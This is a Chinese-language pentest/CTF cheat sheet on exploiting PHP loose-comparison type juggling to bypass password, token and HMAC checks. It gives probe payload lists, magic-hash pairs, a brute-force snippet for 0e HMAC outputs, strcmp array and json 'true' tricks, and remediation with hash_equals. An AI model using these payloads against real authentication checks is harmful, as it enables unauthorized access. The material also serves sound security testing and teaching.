# PHP 类型混淆（松散比较）全手法

**用法**：看到 `==` 比较密码/token/哈希时，先确认 **PHP 版本**（决定一半 payload 是否有效），再按比较对象选 §2-§5 的对应小节。

**目标不是猜出真密码**，而是证明服务端把**不相等的值判成相等**。

## 0. 判据速查

| 代码形态 | 走哪条 | 节 |
|---|---|---|
| `$pass == $input` 比密码/token | 字符串-数字混淆 | §2 |
| `md5($a) == md5($b)` | 0e 魔术哈希 | §3 |
| `hash_hmac(...) != '0'` 或 `== 0` | HMAC 对 "0" 松散比较 | §4 |
| `strcmp($input, $secret) == 0` | 数组传参返回 NULL | §5.1 |
| `intval($id, 0)` / 十六进制 / 八进制 | 进制解析 | §5.2 |
| `json_decode($x, true)` 后比密码 | `true` 强转 | §5.3 |
| `is_numeric($x) && $x == 0` | 科学计数法 | §5.4 |

## 1. 先确定 PHP 版本

**这一步决定后面一半 payload 有效性**，别跳过。

```bash
# 响应头
X-Powered-By: PHP/7.4.3

# 报错页、phpinfo、composer.json、404 页脚
# 都不给就看行为差异（见 §2.2）
```

### 1.1 第一轮探测 payload

```text
password[]=x
password=
0
0e12345
240610708
QNKCDZO
true
[]
{"password":true}
admin%00
```

一次全发，看哪个改变了分支走向。

### 1.2 本地验证

```bash
php -r "var_dump('0e123' == '0e999');"
php -r "var_dump('123a' == 123);"
php -r "var_dump(md5('240610708') == md5('QNKCDZO'));"
```

**用目标同大版本的 PHP 跑**，否则结论不可迁移。

## 2. 松散比较 `==` 的真值表

| 表达式 | 结果 | 机制 |
|---|---|---|
| `'0010e2' == '1e3'` | **true** | 两个都像数字 → 按 float 比，都是 1000.0 |
| `'0e4620…' == '0e8304…'` | **true** | 都解析成科学计数法的 0.0 |
| `'123a' == 123` | **true** | 字符串转 int 到第一个非数字为止 → 123 |
| `'abc' == 0` | **true**（PHP ≤ 7.x） | 非数字字符串与 int 比 → 字符串变 0 |
| `'' == 0` | **true** | 空串 → 0 |
| `'' == false` | **true** | 都 falsy |
| `false == NULL` | **true** | 松散相等 |
| `'0' == false` | **true** | `'0'` 是唯一被当作 false 的非空字符串 |
| `'php' == 0` | **false**（PHP 8+） | PHP 8 修了这条 |

### 2.1 易踩的坑

`'0010e2' == '1e3'` 是 **1000.0 == 1000.0**，不是「都变 0」。把它当 0e 魔术哈希的同类会判断错。

真正「都变 0」的是 `^0e[0-9]+$` 形态（§3）。

### 2.2 PHP 5/7 vs 8 的关键差异

| 项 | PHP 5.x / 7.x | PHP 8.0+ |
|---|---|---|
| `0 == "foo"` | **true** | **false** |
| `md5([])` / `sha1([])` | 警告或 NULL 类行为 | **TypeError** |

**结论**：PHP 8 上 `[]` 那套基本失效，除非错误处理把异常收敛成 NULL。

### 2.3 正确的写法（判断目标是否安全）

```php
hash_equals((string)$expected, (string)$actual);   // 时序安全 + 严格字符串
// 或
$expected === $actual;
```

## 3. 魔术哈希（`0e` + 纯数字）

**判据**：两边都是形如 `^0e[0-9]+$` 的哈希串。PHP 把它们当科学计数法的 float → 都是 **0.0**，于是 `==` 成立。

### 3.1 现成配对

| 算法 | 输入 | 摘要 |
|---|---|---|
| MD5 | `240610708` | `0e462097431906509019562988736854` |
| MD5 | `QNKCDZO` | `0e830400451993494058024219903391` |
| SHA-1 | `10932435112` | `0e07766915004133176347055865026311692244` |

SHA-224/256 也是同一原理，但需要**爆破**——搜到两个不同输入、摘要都匹配 `^0e\d+$`。位数越长越难，CTF 里基本只用 MD5/SHA-1。

### 3.2 利用形态

```php
if (md5($_GET['a']) == md5($_GET['b']) && $_GET['a'] != $_GET['b']) {
    // 本意：不同字符串同 md5（md5 不可能）
    // 实际：两个不同字符串，摘要都是魔术哈希
}
```

```text
?a=240610708&b=QNKCDZO
```

## 4. HMAC 与 `"0"` 的松散比较

**判据**：代码写成 `hash_hmac(...) != '0'` 或 `== 0`。

爆破 `$data`（时间戳、nonce、计数器），直到 HMAC 输出匹配 `^0e[0-9]+$`：

```python
for t in range(T0, T1):
    if re.fullmatch(r'0e\d+', hmac_md5(str(t), key)):
        use(t)
```

**注意**：网上流传的「`1539805986` 的 md5 是 `0e7729…`」是错的，stock PHP 算不出这个值。**必须拿目标的函数和 key 实测**，别抄。

**修法**：`hash_equals($mac, $expected)` + 固定长度十六进制，永远不要拿 HMAC 跟裸 `"0"` 比。

## 5. 其它类型混淆

### 5.1 `strcmp` / `strcasecmp` 传数组

```php
strcmp([], "password");   // PHP 7/8 返回 NULL（参数非法）
// NULL == 0 → true，如果代码写的是：
if (strcmp($_GET['p'], $secret) == 0)
```

```text
?p[]=1
```

**同类**：`strpos`、`preg_match` 等内部函数在参数类型错误时的返回值。

### 5.2 `intval` 进制解析

```php
intval("0x1A", 0);      // → 26（base 0 时识别 0x 前缀）
intval("010", 0);       // → 8（base 0 时识别八进制）
intval((float)"1e2");   // → 100（intval 直接吃会停在 'e'，必须先转 float）
```

```text
?id=0x1A
?id=010
?id=1e2
```

**版本差异**：base 0 的 0x 识别行为在不同版本有变化，实测为准。

### 5.3 `json_decode(..., true)` 的 `true`

```json
{"password": true}
```

```php
$j = json_decode($input, true);
if ($j['password'] == $stored_string)   // true == "非空字符串" → true
```

### 5.4 `is_numeric` + 松散比较

```php
is_numeric("0e12345");   // true
"0e12345" == 0;          // true（科学计数法 → 0.0）
```

### 5.5 反序列化 + 魔术属性

`unserialize($_…)` 的对象若进到 `md5($obj)` 或松散比较，可以用魔术方法把属性值送进比较。找 `unserialize` 附近有 `==` 比哈希的位置。

## 6. 决策树

```
代码用的是 === 或 hash_equals？
├─ 是 → 停，这条路基本走不通
└─ 否（== / strcmp == 0）→ 看比较的两个操作数
   ├─ 两边都是 0e+数字的哈希串 → 魔术哈希碰撞（§3）
   ├─ 一边 int 一边 string      → 字符串/整数混淆（§2）
   ├─ HMAC 对 "0" / 0 比        → 爆破 data 找 0e 摘要（§4）
   └─ 有数组 / json true / strcmp([]) → 类型错误返回 NULL（§5.1/5.3）
```

## 7. 纪律

- **先确认 PHP 版本**。PHP 8 上 `[]` 和 `'abc' == 0` 全部失效，先测再堆 payload。
- **魔术哈希只对 `^0e\d+$` 有效**。`'0010e2' == '1e3'` 是 1000==1000，别混为一谈。
- **HMAC 的 0e 摘要必须实测**。网上流传的配对经常是错的（`1539805986` 就是典型假例）。
- **别拿 `==` 比密码当"低危"**。能绕过认证就是严重漏洞，评级看实际能拿到什么。
- **只在授权目标上用**。这条是语言语义，不是攻击许可。
